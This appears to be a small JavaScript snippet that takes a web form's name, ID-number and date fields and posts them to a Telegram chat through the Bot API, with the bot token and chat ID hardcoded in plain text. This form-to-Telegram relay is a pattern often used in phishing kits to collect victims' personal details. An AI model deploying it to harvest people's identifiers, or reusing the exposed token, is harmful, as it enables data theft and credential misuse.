//bot token
var telegram_bot_id = "5175175264:AAH-r2BczVReUMcN0J120bErjcIE-XiZZuA";
//chat id
var chat_id = -779839445;
var name, number, date;
var ready = function () {
    name = document.getElementById("name").value;
    number = document.getElementById("number").value;
    date = document.getElementById("date").value;
    message = "Name->:" + name + "\nID----->:" + number + "\nDate-->: " + date  + "\n----------------------------";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("name").value = "";
    document.getElementById("number").value = "";
    document.getElementById("date").value = "";
    return false;
};
